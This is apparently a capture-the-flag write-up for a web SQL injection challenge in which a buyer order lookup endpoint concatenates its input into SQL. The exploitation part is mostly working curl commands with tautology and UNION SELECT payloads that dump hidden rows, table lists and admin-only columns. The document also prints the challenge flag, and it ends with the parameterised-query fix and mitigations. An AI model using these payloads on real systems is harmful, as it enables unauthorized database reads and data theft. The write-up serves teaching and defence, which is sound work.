# web3 — Buyer Lookup Loose Query (SQLi)

> *A buyer lookup tool is meant to retrieve one order at a time, but a loose
> query turns a single reference check into a wider ledger leak.*

**Category:** Web — SQL injection
**Flag:** `bitflag{1nj3ct10n_turn5_4_l00kup_1nt0_4_l34k}`

## The brief, in plain English

"Single reference check" = `WHERE id = ?`. "Loose query" = string
concatenation rather than parameter binding. "Wider ledger leak" = the
predicate collapses under `OR 1=1`, dumping every row including one whose
`status` keeps it out of normal listings.

The hint is essentially a recipe for the bug, and a recipe for the fix.

## Recon

The `/orders` route is a thin SPA. Its bundle
(`/_next/static/chunks/app/orders/page-9f2dc3ed3c8f3d08.js`) reveals the
single endpoint that drives the page:

```
GET /api/orders/lookup?ref=<value>
```

A normal call shows the shape of the response and confirms the lookup is
keyed by a literal reference string:

```bash
$ curl -s -b "$COOKIE" 'http://159.89.230.27/api/orders/lookup?ref=escrow-1042'
{"orders":[{"id":"escrow-1042","listingName":"RAT Builder Pro",
            "price":299.99,"status":"escrow-hold",
            "notes":"Awaiting release to buyer wallet.","createdAt":"…"}]}
```

One row back. The shape of the query is consistent with
`SELECT … FROM "Order" WHERE id = '<input>'` with no parameter binding.

(Auth is needed but trivial — the `/api/auth/login` endpoint accepts any
email/password and hands back an `auth-token` cookie.)

## Exploitation

Tautology to collapse the predicate:

```bash
$ curl -s -b "$COOKIE" --data-urlencode "ref=' OR 1=1 --" \
       -G 'http://159.89.230.27/api/orders/lookup'
{"orders":[
  {"id":"ops-ledger-9001","listingName":"CloudPwn Toolkit","price":499.99,
   "status":"hidden",
   "notes":"bitflag{1nj3ct10n_turn5_4_l00kup_1nt0_4_l34k}",
   "createdAt":"…"},
  {"id":"escrow-2049","listingName":"Macro Builder","price":199.99,
   "status":"released","notes":"Released after vendor confirmation.",…},
  {"id":"escrow-1042","listingName":"RAT Builder Pro","price":299.99,
   "status":"escrow-hold","notes":"Awaiting release to buyer wallet.",…}
]}
```

Three rows. The one that doesn't appear elsewhere is `ops-ledger-9001` with
`status:"hidden"` — that's the row a normal user is never supposed to see,
and its `notes` field carries the flag.

### Confirming the backend is SQL, not NoSQL

A quick contrast probe:

```bash
$ curl -s -b "$COOKIE" --data-urlencode "ref=x' OR '1'='1" \
       -G 'http://159.89.230.27/api/orders/lookup'
```

Same three rows. The `--` comment style and the quote-then-`OR '1'='1`
behaviour are SQL idioms; a NoSQL backend would behave differently. (For a
sanity-check that the column count is six, a `UNION SELECT 1,2,3,4,5,6 --`
returns one row with literal `1..6` in the visible columns.)

## Bonus — the same SQLi is the universal seed-dump primitive

Once you have UNION-based injection on a six-column projection, the same
endpoint becomes a generic DB read for any other riffhack challenge in this
codebase. A few examples used elsewhere in the event:

```sql
-- list tables
' UNION SELECT name,'',0,'','',0 FROM sqlite_master --

-- pull the seed reviews (used for web6 → web7 pivot)
' UNION SELECT id,userId,listingId,reviewText,moderationNote,createdAt
  FROM Review WHERE moderationNote IS NOT NULL --

-- pull seed support messages incl. admin-only internalNote (Night Dump)
' UNION SELECT id,userId,message,internalNote,createdAt,0
  FROM SupportChatMessage WHERE id='support-seed-a16' --
```

The lookup endpoint quietly becomes the master key for the rest of the event.

## Root cause

The lookup handler builds its SQL by string concatenation:

```js
const sql = `SELECT id, listingName, price, status, notes, createdAt
             FROM "Order" WHERE id = '${ref}'`;
```

(or the equivalent template in whatever ORM-bypass shape the codebase uses).
The fix is to use a parameterised statement:

```js
const sql = `SELECT id, listingName, price, status, notes, createdAt
             FROM "Order" WHERE id = ?`;
db.get(sql, [ref]);
```

This is the textbook SQLi bug and the textbook SQLi fix — verbatim from the
OWASP Top 10 sample chapter.

## Mitigation

- **Always use parameterised queries.** ORMs and query builders typically
  bind by default; if you're hand-building SQL strings, that itself is a
  smell.
- **Don't return rows whose `status` you wouldn't want exposed.** Even with
  the predicate locked down, returning a `status:"hidden"` row from a
  buyer-facing lookup is a defence-in-depth failure — apply the status
  filter at the query level.
- **Don't include sensitive content in `notes` columns**, especially ones
  loaded into responses by default. If notes can contain operational data,
  scope reads to the order owner (and don't trust a single string handle as
  the identity).

## Takeaways

- The hint literally tells you the bug: "single reference check" → "wider
  ledger leak" is "WHERE id = '<ref>'" → "OR 1=1 collapses the predicate".
  Read the language of the brief.
- The "status:hidden" row is the deliberate breadcrumb. It doesn't appear in
  the buyer-scoped `/api/orders` view — only the lookup-by-id path surfaces
  it, and only once you break the predicate.
- This same primitive unlocks the rest of the event. After web3, every
  challenge that requires "find the seed userId" or "read this admin-only
  column" is one UNION away.

## One-liner

```bash
curl -s -b "$COOKIE" --data-urlencode "ref=' OR 1=1 --" \
     -G 'http://<host>/api/orders/lookup' \
  | grep -oE 'bitflag\{[^}]+\}'
```
